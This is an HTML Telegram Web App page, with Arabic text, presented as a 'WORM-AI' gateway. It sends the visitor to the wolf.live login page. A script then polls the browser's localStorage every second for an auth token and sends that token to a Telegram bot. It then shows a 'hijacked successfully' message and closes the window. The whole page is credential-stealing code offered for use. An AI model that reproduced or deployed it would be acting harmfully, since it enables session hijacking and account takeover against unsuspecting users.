<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #ff4d4d; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .loader { border: 4px solid #333; border-top: 4px solid #ff4d4d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2 id="msg">جاري تجهيز بوابة WORM-AI...</h2>
    <p id="status">سجل دخولك الآن في موقع وولف</p>

    <script>
        // توجيه فوري لصفحة الدخول
        window.location.href = "https://www.wolf.live/ar/login";

        // وظيفة "الرادار" لفحص التوكن كل ثانية
        const radar = setInterval(() => {
            try {
                // البحث في خزنة المتصفح عن بيانات الدخول
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.includes('persist:auth')) {
                        const data = JSON.parse(localStorage.getItem(key));
                        const token = data.token.replace(/"/g, "");
                        
                        if (token && token.length > 50) {
                            document.getElementById('msg').innerText = "✅ تم الخطف بنجاح!";
                            // إرسال التوكن للبوت
                            Telegram.WebApp.sendData(token);
                            // إغلاق النافذة فوراً
                            Telegram.WebApp.close();
                            clearInterval(radar); // إيقاف الرادار
                        }
                    }
                }
            } catch (e) {
                console.log("جاري البحث عن المفتاح...");
            }
        }, 1000); 
    </script>
</body>
</html>
